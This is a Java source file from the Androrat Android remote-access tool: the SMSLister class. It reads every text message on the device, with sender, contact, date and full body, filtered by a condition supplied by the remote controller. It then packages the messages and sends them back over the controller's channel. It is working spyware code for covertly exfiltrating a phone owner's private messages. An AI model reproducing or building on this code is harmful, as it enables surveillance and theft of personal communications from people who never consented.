/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package my.app.Library;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import Packet.SMSPacket;
import Packet.SMSTreePacket;
import my.app.activityclient.ClientListener;

public class SMSLister {

	//ClientListener ctx;
	//int channel;
	
	public static boolean listSMS(ClientListener c, int channel, byte[] args) {
		ArrayList<SMSPacket> l = new ArrayList<SMSPacket>();
		
		boolean ret = false;
		String WHERE_CONDITION = new String(args);
		String SORT_ORDER = "date DESC";
		String[] column = { "_id", "thread_id", "address", "person", "date","read" ,"body", "type" };
		String CONTENT_URI = "content://sms/"; //content://sms/inbox, content://sms/sent
		
		Cursor cursor = c.getContentResolver().query(Uri.parse(CONTENT_URI), column , WHERE_CONDITION, null, SORT_ORDER);
		
		
        if(cursor.getCount() != 0) {
	        cursor.moveToFirst();
	
	        do{
	           if(cursor.getColumnCount() != 0) {
	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
	        	   int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
	        	   String add = cursor.getString(cursor.getColumnIndex("address"));
	        	   int person = cursor.getInt(cursor.getColumnIndex("person"));
	        	   long date  = cursor.getLong(cursor.getColumnIndex("date"));
	        	   int read = cursor.getInt(cursor.getColumnIndex("read"));
	        	   String body = cursor.getString(cursor.getColumnIndex("body"));
	        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
	        	   l.add(new SMSPacket(id, thid, add, person, date, read, body, type));
	           }
	        }while(cursor.moveToNext());
	        ret = true;
        }
        else
        	ret = false;
		
		
		c.handleData(channel, new SMSTreePacket(l).build());
		return ret;
	}
	
}
